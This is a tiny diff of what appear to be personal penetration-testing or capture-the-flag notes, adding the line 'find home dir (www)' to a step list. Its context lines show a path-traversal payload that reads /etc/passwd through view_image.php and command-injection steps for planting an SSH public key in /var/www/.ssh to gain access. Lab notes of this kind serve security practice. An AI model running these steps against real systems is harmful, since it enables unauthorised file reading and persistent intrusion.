@@ -70,6 +70,7 @@ view_image.php?file=../../etc/passwd
 Command Injection
 ssh-keygen -t rsa -b 4096
 cat id_rsa.pub
+find home dir (www)
 :mkdir /var/www/.ssh
 : ls -la /var/www/
 copy entire public key 
